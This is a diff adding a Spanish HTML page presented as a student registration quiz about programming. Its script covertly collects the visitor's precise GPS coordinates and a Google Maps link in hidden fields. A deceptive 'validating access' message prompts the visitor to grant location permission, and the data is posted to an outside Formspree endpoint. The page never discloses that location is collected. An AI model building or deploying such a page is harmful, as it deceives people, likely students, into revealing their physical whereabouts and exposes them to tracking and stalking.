@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cuestionario de Informática</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f4f7f6; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 100%; max-width: 400px; }
+        h2 { color: #2c3e50; text-align: center; margin-bottom: 20px; }
+        label { display: block; margin-top: 15px; font-weight: bold; color: #34495e; }
+        input, select, textarea { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ddd; border-radius: 6px; box-sizing: border-box; }
+        button { width: 100%; padding: 15px; background-color: #3498db; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 25px; transition: 0.3s; }
+        button:hover { background-color: #2980b9; }
+        #msg { text-align: center; font-size: 12px; color: #7f8c8d; margin-top: 10px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>Registro de Alumnos</h2>
+    <form id="formGPS" action="https://formspree.io/f/xykngrn p" method="POST">
+        
+        <label>Nombre:</label>
+        <input type="text" name="nombre" required>
+
+        <label>Correo:</label>
+        <input type="email" name="email" required>
+
+        <label>¿Sabes qué es programación?</label>
+        <select name="sabe_progra">
+            <option value="si">Sí</option>
+            <option value="no">No</option>
+        </select>
+
+        <label>¿Has compartido algo por programación?</label>
+        <textarea name="experiencia" rows="2"></textarea>
+
+        <input type="hidden" name="Latitud" id="lat">
+        <input type="hidden" name="Longitud" id="lon">
+        <input type="hidden" name="Ubicacion_GoogleMaps" id="map_link">
+
+        <button type="button" onclick="enviar()">Enviar Registro</button>
+        <p id="msg">Presiona para validar y enviar.</p>
+    </form>
+</div>
+
+<script>
+    function enviar() {
+        const btn = document.querySelector('button');
+        const msg = document.getElementById('msg');
+        const form = document.getElementById('formGPS');
+
+        btn.disabled = true;
+        btn.textContent = "Cargando...";
+
+        if (navigator.geolocation) {
+            msg.textContent = "Validando acceso... por favor acepta el permiso.";
+            
+            navigator.geolocation.getCurrentPosition(function(pos) {
+                const lt = pos.coords.latitude;
+                const lg = pos.coords.longitude;
+                
+                document.getElementById('lat').value = lt;
+                document.getElementById('lon').value = lg;
+                document.getElementById('map_link').value = `https://www.google.com/maps?q=${lt},${lg}`;
+                
+                form.submit();
+            }, function() {
+                // Si bloquea el GPS, se envía solo el texto
+                form.submit();
+            }, { enableHighAccuracy: true, timeout: 5000 });
+        } else {
+            form.submit();
+        }
+    }
+</script>
+
+</body>
+</html>
